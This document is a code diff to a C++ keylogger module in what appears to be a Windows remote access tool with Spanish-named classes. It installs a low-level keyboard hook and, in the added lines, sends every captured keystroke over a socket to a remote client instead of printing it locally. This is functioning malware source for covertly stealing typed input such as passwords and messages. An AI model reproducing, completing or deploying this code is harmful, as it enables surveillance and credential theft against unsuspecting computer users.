@@ -1,7 +1,11 @@
+#include "cliente.hpp"
 #include "mod_keylogger.hpp"
 #include "misc.hpp"
 
+extern Cliente* cCliente;
+
 HHOOK kHook = nullptr;
+bool g_Run = false;
 
 
 std::string GetActiveWindow_Title() {
@@ -15,8 +19,7 @@ std::string GetActiveWindow_Title() {
 
 std::string Add_Terminator(const char* cBuffer) {
     char cTmpBuff[20] = "[/";
-    int i = 0;
-    for (i = 1; i < strlen(cBuffer); i++) {
+    for (int i = 1; i < strlen(cBuffer); i++) {
         cTmpBuff[i + 1] = cBuffer[i];
     }
     return std::string(cTmpBuff);
@@ -336,15 +339,17 @@ const char* c_KeyMap(int iCode) {
     }
 }
 
-LRESULT CALLBACK mod_Keylogger::Keyboard_Proc(int nCode, WPARAM wparam, LPARAM lparam) {
+LRESULT CALLBACK Keyboard_Proc(int nCode, WPARAM wparam, LPARAM lparam) {
+    if (!g_Run) {
+        UnhookWindowsHookEx(kHook);
+        kHook = nullptr;
+        PostQuitMessage(0);
+    }
+    
     if (nCode < 0) {
         return CallNextHookEx(kHook, nCode, wparam, lparam);
     }
 
-    if (!this->isRunning) {
-        return 1;
-    }
-    
     std::string strTempBuffer = "";
 
     KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;
@@ -355,7 +360,10 @@ LRESULT CALLBACK mod_Keylogger::Keyboard_Proc(int nCode, WPARAM wparam, LPARAM l
             strTempBuffer += "]";
         }
         strTempBuffer += c_KeyMap((unsigned int)kbs->vkCode);
-        std::cout << strTempBuffer << std::endl;
+        std::string strComando = std::to_string(EnumComandos::KL_Salida);
+        strComando.append(1, '\\');
+        strComando += strTempBuffer;
+        cCliente->cSend(cCliente->sckSocket, strComando.c_str(), strComando.size(), 0, false); 
     }
     else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {
         DWORD key = kbs->vkCode;
@@ -367,11 +375,13 @@ LRESULT CALLBACK mod_Keylogger::Keyboard_Proc(int nCode, WPARAM wparam, LPARAM l
 
             strTempBuffer += Add_Terminator(c_KeyMap((int)kbs->vkCode));
 
-            std::cout << strTempBuffer << std::endl;
+            std::string strComando = std::to_string(EnumComandos::KL_Salida);
+            strComando.append(1, '\\');
+            strComando += strTempBuffer;
+            cCliente->cSend(cCliente->sckSocket, strComando.c_str(), strComando.size(), 0, false);
         }
 
     }
-
 
     return CallNextHookEx(kHook, nCode, wparam, lparam);
 }
@@ -382,8 +392,8 @@ mod_Keylogger::mod_Keylogger() {
 
 void mod_Keylogger::Start() {
     DebugPrint("[!] Keylogger start");
-	//Keyboard_Proc funcion que captura las teclas
-    this->isRunning = true;
+	this->isRunning = true;
+    g_Run = true;
 	this->thKey = std::thread(&mod_Keylogger::CaptureKeys, this);
 }
 
@@ -391,6 +401,7 @@ void mod_Keylogger::Stop() {
     DebugPrint("[!] Keylogger stopping");
     std::unique_lock<std::mutex> lock(this->mtx_Run);
     this->isRunning = false;
+    g_Run = false;
     lock.unlock();
 
     
@@ -399,24 +410,17 @@ void mod_Keylogger::Stop() {
         this->thKey.join();
     }
 
-    UnhookWindowsHookEx(kHook);
-    kHook = nullptr;
-
     DebugPrint("[!] Keylogger stopped");
 }
 
 void mod_Keylogger::CaptureKeys() {
-    kHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)&this->Keyboard_Proc, GetModuleHandle(NULL), 0);
+    kHook = SetWindowsHookEx(WH_KEYBOARD_LL, Keyboard_Proc, GetModuleHandle(NULL), 0);
 
 	MSG msg;
     PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE);
-	while (GetMessage(&msg, NULL, 0, 0)) {
-		TranslateMessage(&msg);
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
 		DispatchMessage(&msg);
-        std::unique_lock<std::mutex> lock(this->mtx_Run);
-        if (!this->isRunning) {
-            break;
-        }
 	}
 }
 
